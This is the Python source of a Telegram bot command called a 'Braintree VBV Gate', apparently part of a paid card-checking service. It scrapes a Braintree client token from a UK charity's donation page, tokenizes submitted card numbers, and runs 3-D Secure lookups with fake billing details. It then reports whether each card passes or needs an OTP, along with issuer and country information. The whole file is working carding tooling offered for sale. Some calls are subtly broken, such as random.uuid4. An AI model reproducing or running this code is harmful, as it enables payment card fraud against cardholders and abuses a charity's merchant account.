"""
Braintree VBV Gate
Command: /vbv
Type: Auth
"""

from aiogram import Router, F, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import logging
import re
import asyncio
import time
import random
import requests
import json
import base64
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from database import get_user_credits, update_credits, get_user
from bin import get_bin_info
from sub import get_premium_status

router = Router()
user_last_command_time = {}

SITE_URL = "https://cllsupport.org.uk"
DONATE_URL = f"{SITE_URL}/donate/"
BRAINTREE_GRAPHQL = "https://payments.braintree-api.com/graphql"
BRAINTREE_API = "https://api.braintreegateway.com"

STATUS_MAP = {
    "authenticate_successful": "PASSED",
    "authenticate_attempt_successful": "PASSED",
    "challenge_required": "OTP_REQUIRED",
    "authenticate_frictionless_failed": "OTP_REQUIRED",
    "lookup_card_error": "NOT_ENROLLED",
    "authenticate_rejected": "NOT_ENROLLED",
    "lookup_error": "ERROR",
    "authenticate_unavailable": "NOT_ENROLLED",
    "authenticate_error": "ERROR",
    "no_response": "FAILED",
}

def extract_auth(session):
    try:
        r = session.get(DONATE_URL, timeout=20)
        m = re.search(r'name="clientToken"\s+value="([^"]+)"', r.text)
        if not m:
            m = re.search(r'var\s+wc_braintree_client_token\s*=\s*\["(.*?)"\]', r.text)
        if m:
            token_b64 = m.group(1)
            decoded = base64.b64decode(token_b64).decode("utf-8")
            data = json.loads(decoded)
            auth = data.get("authorizationFingerprint", "")
            merch = data.get("merchantId", "")
            if auth and merch:
                return auth, merch
        return None, None
    except:
        return None, None

def tokenize_card(session, auth, cc, mm, yy, cvv):
    if len(yy) == 2:
        yy = "20" + yy
    query = """mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
        tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } }
    }"""
    variables = {
        "input": {
            "creditCard": {
                "number": cc,
                "expirationMonth": mm,
                "expirationYear": yy,
                "cvv": cvv,
            },
            "options": {"validate": False},
        }
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json",
        "Authorization": f"Bearer {auth}",
        "Braintree-Version": "2018-05-10",
        "Content-Type": "application/json",
    }
    body = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": str(random.uuid4()),
        },
        "query": query,
        "variables": variables,
        "operationName": "TokenizeCreditCard",
    }
    resp = session.post(BRAINTREE_GRAPHQL, headers=headers, json=body, timeout=30)
    data = resp.json()
    if "errors" in data:
        return None, None, None
    token = data["data"]["tokenizeCreditCard"]["token"]
    card_info = data["data"]["tokenizeCreditCard"]["creditCard"]
    return token, card_info.get("last4", ""), card_info.get("brandCode", "VISA")

def lookup_3ds(session, auth, merch, token, cc):
    url = f"{BRAINTREE_API}/merchants/{merch}/client_api/v1/payment_methods/{token}/three_d_secure/lookup"
    payload = {
        "amount": "1.00",
        "browserColorDepth": 24,
        "browserJavaEnabled": False,
        "browserJavascriptEnabled": True,
        "browserLanguage": "en-GB",
        "browserScreenHeight": 800,
        "browserScreenWidth": 360,
        "browserTimeZone": -345,
        "deviceChannel": "Browser",
        "additionalInfo": {
            "ipAddress": "8.8.8.8",
            "billingLine1": "New York",
            "billingCity": "New York",
            "billingState": "NY",
            "billingPostalCode": "10080",
            "billingCountryCode": "US",
            "billingPhoneNumber": "998773772",
            "billingGivenName": "John",
            "billingSurname": "Doe",
            "email": "john@gmail.com",
        },
        "bin": cc[:6],
        "dfReferenceId": f"0_{random.uuid4()}",
        "clientMetadata": {
            "requestedThreeDSecureVersion": "2",
            "sdkVersion": "web/3.115.1",
        },
        "authorizationFingerprint": auth,
        "braintreeLibraryVersion": "braintree/web/3.115.1",
        "_meta": {
            "merchantAppId": "cllsupport.org.uk",
            "platform": "web",
            "sdkVersion": "3.115.1",
            "source": "client",
            "integration": "custom",
        },
    }
    resp = session.post(url, headers={"User-Agent": "Mozilla/5.0", "Accept": "application/json"}, json=payload, timeout=45)
    if resp.status_code in [200, 201]:
        return resp.json()
    return {}

def parse_status(lookup):
    try:
        return lookup["paymentMethod"]["threeDSecureInfo"]["status"]
    except:
        return "no_response"

async def process_vbv_card(cc, mm, yy, cvv):
    try:
        session = requests.Session()
        session.headers.update({"User-Agent": "Mozilla/5.0"})
        auth, merch = extract_auth(session)
        if not auth:
            return {"status": "ERROR", "message": "Auth failed"}
        
        token, last4, brand = tokenize_card(session, auth, cc, mm, yy, cvv)
        if not token:
            return {"status": "ERROR", "message": "Tokenization failed"}
        
        lookup = lookup_3ds(session, auth, merch, token, cc)
        result_code = parse_status(lookup)
        status = STATUS_MAP.get(result_code, "UNKNOWN")
        
        return {"status": status, "message": result_code}
    except Exception as e:
        return {"status": "ERROR", "message": str(e)[:80]}

async def get_user_plan_name(user_id):
    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)
    if is_premium:
        try:
            user = await asyncio.to_thread(get_user, user_id)
            if user:
                return user.get("plan", "PREMIUM")
            return "PREMIUM"
        except Exception as e:
            logging.error(f"Error fetching plan name: {e}")
        return "PREMIUM"
    return "TRIAL"

@router.message(Command("vbv"))
async def vbv_command(message: types.Message):
    user = message.from_user
    user_id = user.id
    current_time = time.time()

    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)
    if not is_premium:
        if user_id in user_last_command_time:
            elapsed = current_time - user_last_command_time[user_id]
            if elapsed < 10:
                remaining = round(10 - elapsed, 1)
                await message.reply(
                    f"⚠️ <b>𝗦𝗹𝗼𝘄 𝗗𝗼𝘄𝗻!</b>\n"
                    f"𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 <code>{remaining}</code> 𝘀𝗲𝗰𝗼𝗻𝗱𝘀.",
                    parse_mode="HTML"
                )
                return
        user_last_command_time[user_id] = current_time

    credits = await asyncio.to_thread(get_user_credits, user_id)
    if credits is None or credits < 1:
        await message.reply("❌ <b>𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗖𝗿𝗲𝗱𝗶𝘁𝘀!</b>", parse_mode="HTML")
        return

    args = message.text.split()[1:]
    if not args:
        await message.reply(
            "💳 <b>𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗩𝗕𝗩 𝗚𝗮𝘁𝗲</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "📟 𝗖𝗼𝗺𝗺𝗮𝗻𝗱: <code>/vbv</code>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "📌 𝗨𝘀𝗮𝗴𝗲: <code>/vbv CC|MM|YY|CVV</code>\n\n"
            "📝 𝗘𝘅𝗮𝗺𝗽𝗹𝗲: <code>/vbv 4111111111111111|12|25|123</code>",
            parse_mode="HTML"
        )
        return

    card = args[0]
    pattern = r'\b(\d{15,16})[|\s/?\\:]+(\d{2,4})[|\s/?\\:]+(\d{2,4})[|\s/?\\:]+(\d{3,4})\b'
    match = re.search(pattern, card)
    if not match:
        await message.reply("❌ <b>𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗖𝗮𝗿𝗱 𝗙𝗼𝗿𝗺𝗮𝘁.</b>", parse_mode="HTML")
        return

    cc, mm, yy_raw, cvv = match.groups()
    yy = yy_raw[2:] if len(yy_raw) == 4 else yy_raw
    formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"

    proc_msg = await message.reply("<pre>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴…⏳</pre>", parse_mode="HTML")
    result = await process_vbv_card(cc, mm, yy, cvv)
    
    status = result.get("status", "ERROR")
    msg = result.get("message", "Unknown")
    plan_name = await get_user_plan_name(user_id)
    
    if status == "PASSED":
        final_status = "✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗"
        await asyncio.to_thread(update_credits, user_id, credits - 1)
    elif status == "OTP_REQUIRED":
        final_status = "🔐 𝟯𝗗𝗦 𝗥𝗘𝗤𝗨𝗜𝗥𝗘𝗗"
        await asyncio.to_thread(update_credits, user_id, credits - 1)
    else:
        final_status = "❌ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗"

    bin_info = await get_bin_info(cc[:6])
    user_link = f'<a href="tg://user?id={user_id}">{user.first_name}</a>'
    dev_link = '<a href="https://t.me/npnbit4">npnbit4</a>'

    caption = (
        f"𝗦𝘁𝗮𝘁𝘂𝘀 ➛ {final_status}\n"
        f"𝗖𝗮𝗿𝗱 ➛ <code>{formatted_cc}</code>\n"
        f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ 𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗩𝗕𝗩\n"
        f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➛ <b>{msg}</b>\n"
        f"𝗕𝗿𝗮𝗻𝗱 ➛ <b>{bin_info.get('scheme', 'Unknown')}</b>\n"
        f"𝗜𝘀𝘀𝘂𝗲𝗿 ➛ <b>{bin_info.get('bank', 'Unknown')}</b>\n"
        f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➛ <b>{bin_info.get('country', 'Unknown')}</b>\n"
        f"𝗨𝘀𝗲𝗿 ➛ {user_link} ({plan_name})\n"
        f"𝗗𝗲𝘃 ➛ {dev_link}"
    )

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 𝗕𝗨𝗬 𝗡𝗢𝗪", url="https://t.me/npnbit4")]
    ])

    await proc_msg.edit_text(text=caption, parse_mode="HTML", reply_markup=kb)
